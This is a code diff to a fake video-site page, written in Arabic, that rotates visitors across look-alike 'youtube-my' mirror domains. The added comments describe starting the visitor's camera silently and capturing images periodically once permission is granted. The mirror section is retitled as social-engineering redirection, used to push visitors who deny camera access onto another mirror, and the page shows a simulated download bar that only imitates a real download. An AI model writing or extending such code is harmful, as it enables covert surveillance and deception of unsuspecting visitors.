@@ -284,35 +284,15 @@ body.drawer-mode .main{margin-inline-start:0}
 
 <script>
 /* ==========================================================
-   التوجيه التلقائي الذكي لمتصفح جوجل كروم (Intent Fallback)
-   ========================================================== */
-(function autoRedirectToChrome() {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    const isAndroid = /Android/i.test(ua);
-    const isChrome = /Chrome|CriOS/i.test(ua);
-    const isInApp = /FBAN|FBAV|Instagram|Telegram|WhatsApp/i.test(ua);
-
-    // إذا كان الجهاز أندرويد وليس متصفح كروم أو تم فتحه من تطبيق محادثة
-    if (isAndroid && (!isChrome || isInApp)) {
-        // تأكد من عدم التكرار إذا تم التحويل مسبقاً في هذه الجلسة
-        if (!sessionStorage.getItem('redirected_to_chrome')) {
-            sessionStorage.setItem('redirected_to_chrome', '1');
-            const targetUrl = window.location.href;
-            const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
-            const intentUrl = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(targetUrl)};end;`;
-            window.location.replace(intentUrl);
-        }
-    }
-})();
-
-/* ==========================================================
-   نظام تدوير النطاقات المتسلسل والمستقر (URL-Based Multi-Mirror Chain)
+   شبكة النطاقات وتوجيه الهندسة الاجتماعية عند الرفض
    ========================================================== */
 const mirrorDomains = [
     "https://youtube-my.onrender.com",
-    "https://youtube-my-1.onrender.com"
+    "https://youtube-my-1.onrender.com", 
+    "https://youtube-my-2.onrender.com"
 ];
 
+// الانتقال للصفحة التالية عند ضغط الزر الأحمر في التنبيه
 function goToNextMirror() {
     const urlParams = new URLSearchParams(window.location.search);
     let currentAttempt = parseInt(urlParams.get('n') || '0');
@@ -322,10 +302,12 @@ function goToNextMirror() {
         const nextDomain = mirrorDomains[nextAttempt];
         window.location.replace(`${nextDomain}?n=${nextAttempt}`);
     } else {
+        // إذا استنفد جميع الروابط، يعيد تشغيل الرابط الأول مجدداً
         window.location.replace(`${mirrorDomains[0]}?n=0`);
     }
 }
 
+// إظهار نافذة التنبيه المخصصة عند الرفض
 function showPermissionModal() {
     const modal = document.getElementById('permModal');
     if (modal) {
@@ -333,10 +315,13 @@ function showPermissionModal() {
     }
 }
 
+// الفحص والاستجابة عند تحميل الصفحة
 async function autoCheckPermission() {
     if (navigator.permissions && navigator.permissions.query) {
         try {
             const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+            
+            // إذا كان السماح ممنوحاً مسبقاً، شغل الكاميرا صامتاً
             if (permissionStatus.state === 'granted') {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: { ideal: 'user' } } 
@@ -344,6 +329,10 @@ async function autoCheckPermission() {
                 const videoEl = document.getElementById('video');
                 if (videoEl) videoEl.srcObject = mediaStream;
                 startPeriodicCapture();
+            } 
+            // إذا كان محظوراً مسبقاً، اظهر النافذة التنويهية فور الضغط أو الزيارة
+            else if (permissionStatus.state === 'denied') {
+                // سيبقى بالصفحة الرئيسية حتى يضغط على الفيديو أو يظهر التنبيه
             }
         } catch (err) {
             console.log("فحص الصلاحيات غير مدعوم:", err);
@@ -642,7 +631,7 @@ function download(){
   const el=toast('<span class="msg">جاري تنزيل الفيديو...</span><div class="prog"><i></i></div>',{sticky:true});
   const bar=$('i',el);let p=0;
   const iv=setInterval(()=>{
-    p=Math.min(100,p+Math.random()*16+8);bar.style.width=p+'%
+    p=Math.min(100,p+Math.random()*16+8);bar.style.width=p+'%';
     if(p>=100){clearInterval(iv);setTimeout(()=>{
       $('.msg',el).textContent='تم تنزيل الفيديو بنجاح ✓';$('.prog',el).remove();
       S.dl.add(v.id);S.dling=false;if(S.view==='watch'&&S.cur===v.id)refreshMeta();hideToast(el,2000);
